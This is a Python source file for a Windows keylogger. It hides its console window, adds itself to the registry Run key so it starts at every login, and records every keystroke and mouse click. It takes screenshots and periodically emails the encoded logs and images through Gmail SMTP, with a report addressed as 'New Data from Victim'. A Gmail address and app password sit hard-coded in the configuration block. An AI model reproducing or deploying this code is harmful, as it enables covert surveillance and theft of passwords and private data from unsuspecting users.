import sys, os, time, random, smtplib, string, base64
from winreg import *  # for addStartup function
import win32console, win32gui
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard, mouse

# ---------- CONFIGURE BELOW FOR TESTING ONLY ----------
yourgmail = "alicetsm1@gmail.com"
yourgmailpass = "bygb jayl gnzm vyry"  # Use your Gmail App Password here
sendto = "alicetsm1@gmail.com"
interval = 60
# ------------------------------------------------------

t = ""
start_time = time.time()
pics_names = []

def addStartup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = os.path.join(fp, file_name)
    key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
    SetValueEx(key, 'MyKeylogger', 0, REG_SZ, new_file_path)

def Hide():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

def ScreenShot():
    import pyautogui
    name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7)) + '.png'
    pyautogui.screenshot().save(name)
    pics_names.append(name)

def Mail_it(data, pics_names):
    try:
        msg = MIMEMultipart()
        msg['From'] = yourgmail
        msg['To'] = sendto
        msg['Subject'] = "Keylogger Report"

        body = base64.b64encode(data.encode()).decode()
        # Attach body as a text part
        from email.mime.text import MIMEText
        msg.attach(MIMEText("New Data from Victim (Base64 Encoded):\n" + body))

        for pic in pics_names:
            part = MIMEBase('application', 'octet-stream')
            with open(pic, 'rb') as file:
                part.set_payload(file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{pic}"')
            msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(yourgmail, yourgmailpass)
        server.sendmail(yourgmail, sendto, msg.as_string())
        server.quit()
    except Exception as e:
        print("Error sending email:", e)

def on_press(key):
    global t, start_time
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)

    data = f"\n[{time.ctime().split(' ')[3]}] Keyboard Key: {key_str}\n===================="
    t += data

    if len(t) > 500:
        with open("Logfile.txt", "a") as f:
            f.write(t)
        t = ""

    if time.time() - start_time >= interval:
        Mail_it(t, pics_names)
        start_time = time.time()
        t = ""

def on_click(x, y, button, pressed):
    global t, start_time
    if pressed:
        data = f"\n[{time.ctime().split(' ')[3]}] Mouse Click at {(x, y)} with {button}\n===================="
        t += data

        if len(t) > 300:
            ScreenShot()

        if len(t) > 500:
            with open("Logfile.txt", "a") as f:
                f.write(t)
            t = ""

        if time.time() - start_time >= interval:
            Mail_it(t, pics_names)
            start_time = time.time()
            t = ""

if __name__ == "__main__":
    addStartup()
    Hide()

    with keyboard.Listener(on_press=on_press) as keyboard_listener, \
         mouse.Listener(on_click=on_click) as mouse_listener:
        keyboard_listener.join()
        mouse_listener.join()



